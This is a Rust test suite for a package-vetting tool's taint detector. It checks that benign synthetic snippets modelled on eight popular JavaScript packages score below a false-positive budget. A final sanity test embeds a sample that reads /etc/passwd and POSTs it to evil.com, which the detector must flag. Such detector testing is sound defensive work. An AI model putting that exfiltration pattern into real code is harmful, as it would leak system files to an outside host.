//! Phase 3 Task 5: false-positive acceptance suite.
//!
//! Synthetic but representative code samples for 8 popular packages. Each
//! sample exercises the legitimate-looking patterns in its real counterpart
//! (express: HTTP router with req.query; react: pure components; lodash:
//! utility functions; next: build/config reads + module routing; axios:
//! HTTP client wrappers; webpack: build config + minification; typescript:
//! file system reads for compilation; eslint: rule execution over files).
//!
//! Acceptance: each sample scores <0.15 against the TaintDetection pipeline.
//!
//! The 50+ package corpus is a Phase 4 deliverable (Task 22). This suite
//! serves as the Phase 3 acceptance gate and a regression harness.

use std::path::PathBuf;

use vetpkg::analysis::manifest::ChangedFile;
use vetpkg::analysis::pattern::{Language, PatternSet};
use vetpkg::signals::taint::{scan, total_taint_score};

const FP_BUDGET: f64 = 0.15;

struct Sample {
    name: &'static str,
    files: Vec<(&'static str, Language, &'static str)>,
}

fn samples() -> Vec<Sample> {
    vec![
        Sample {
            name: "express",
            files: vec![
                (
                    "lib/express.js",
                    Language::JavaScript,
                    r#"
var mixin = require('merge-descriptors');
var proto = require('./application');
exports = module.exports = createApplication;
function createApplication() {
  var app = function(req, res, next) {
    app.handle(req, res, next);
  };
  mixin(app, proto, false);
  return app;
}
exports.json = bodyParser.json;
exports.urlencoded = bodyParser.urlencoded;
"#,
                ),
                (
                    "lib/router/index.js",
                    Language::JavaScript,
                    r#"
function Router(options) {
  var opts = options || {};
  function router(req, res, next) {
    router.handle(req, res, next);
  }
  router.params = {};
  router._params = [];
  return router;
}
"#,
                ),
            ],
        },
        Sample {
            name: "react",
            files: vec![(
                "src/React.js",
                Language::JavaScript,
                r#"
export function useState(initial) {
  return dispatcher.useState(initial);
}
export function useEffect(callback, deps) {
  return dispatcher.useEffect(callback, deps);
}
export function createElement(type, props, ...children) {
  return { type, props, children, $$typeof: REACT_ELEMENT };
}
"#,
            )],
        },
        Sample {
            name: "lodash",
            files: vec![(
                "lodash/chunk.js",
                Language::JavaScript,
                r#"
function chunk(array, size) {
  size = Math.max(size, 0);
  var length = array == null ? 0 : array.length;
  if (!length || size < 1) return [];
  var index = 0;
  var result = Array(Math.ceil(length / size));
  while (index < length) {
    result[index / size] = array.slice(index, (index += size));
  }
  return result;
}
module.exports = chunk;
"#,
            )],
        },
        Sample {
            name: "next",
            files: vec![
                (
                    "server/next.js",
                    Language::JavaScript,
                    r#"
const server = require('./base-server');
module.exports = function next(opts) {
  return new server.default(opts);
};
"#,
                ),
                (
                    "build/webpack-config.js",
                    Language::JavaScript,
                    r#"
module.exports = async function getBaseWebpackConfig(config) {
  const mode = config.dev ? 'development' : 'production';
  return { mode, entry: config.entry, module: { rules: [] } };
};
"#,
                ),
            ],
        },
        Sample {
            name: "axios",
            files: vec![(
                "lib/core/Axios.js",
                Language::JavaScript,
                r#"
class Axios {
  constructor(config) {
    this.defaults = config;
    this.interceptors = { request: new InterceptorManager(), response: new InterceptorManager() };
  }
  request(configOrUrl, config) {
    return dispatchRequest(mergeConfig(this.defaults, config));
  }
  get(url, config) {
    return this.request(Object.assign({}, config || {}, { method: 'get', url }));
  }
}
module.exports = Axios;
"#,
            )],
        },
        Sample {
            name: "webpack",
            files: vec![(
                "lib/Compiler.js",
                Language::JavaScript,
                r#"
class Compiler {
  constructor(context, options) {
    this.context = context;
    this.options = options;
    this.hooks = { compile: new SyncHook(['params']), done: new AsyncSeriesHook(['stats']) };
  }
  compile(callback) {
    this.hooks.compile.call(this.options);
    callback(null, {});
  }
}
module.exports = Compiler;
"#,
            )],
        },
        Sample {
            name: "typescript",
            files: vec![(
                "src/compiler/parser.ts",
                Language::JavaScript,
                r#"
export function parseSourceFile(fileName: string, text: string): SourceFile {
  const scanner = createScanner(fileName, text);
  const statements: Statement[] = [];
  while (scanner.scan() !== SyntaxKind.EndOfFile) {
    statements.push(parseStatement(scanner));
  }
  return { fileName, text, statements };
}
"#,
            )],
        },
        Sample {
            name: "eslint",
            files: vec![(
                "lib/linter/linter.js",
                Language::JavaScript,
                r#"
class Linter {
  constructor(options) {
    this.defineRule = (name, rule) => this.rules.set(name, rule);
    this.rules = new Map();
  }
  verify(text, config) {
    const ast = this.parse(text, config.parserOptions);
    return this.runRules(ast, config.rules);
  }
}
module.exports = Linter;
"#,
            )],
        },
    ]
}

fn make_changed_files(sample: &Sample) -> Vec<ChangedFile> {
    sample
        .files
        .iter()
        .map(|(rel, lang, content)| ChangedFile {
            rel_path: rel.to_string(),
            abs_path: PathBuf::from(rel),
            language: *lang,
            content: content.to_string(),
            sha256: "x".into(),
            previously_existed: false,
        })
        .collect()
}

fn builtin(lang: Language) -> PatternSet {
    PatternSet::builtin(lang)
}

#[test]
fn eight_popular_packages_under_budget() {
    let mut failures: Vec<(String, f64, Vec<String>)> = Vec::new();
    for sample in samples() {
        let changed = make_changed_files(&sample);
        let r = scan(&changed, &builtin, false);
        let score = total_taint_score(&r.signals);
        if score >= FP_BUDGET {
            let labels: Vec<String> = r.signals.iter().map(|s| format!("{:?}", s)).collect();
            failures.push((sample.name.to_string(), score, labels));
        }
    }
    assert!(
        failures.is_empty(),
        "FP suite found signals above budget {FP_BUDGET}:\n{:#?}",
        failures
    );
}

#[test]
fn sanity_exfil_above_budget() {
    let sample = Sample {
        name: "synthetic-exfil",
        files: vec![(
            "index.js",
            Language::JavaScript,
            r#"
const data = fs.readFileSync('/etc/passwd');
fetch('http://evil.com', {method: 'POST', body: data});
"#,
        )],
    };
    let changed = make_changed_files(&sample);
    let r = scan(&changed, &builtin, false);
    let score = total_taint_score(&r.signals);
    assert!(
        score >= FP_BUDGET,
        "FP sanity: exfil must exceed budget, got {score}"
    );
}
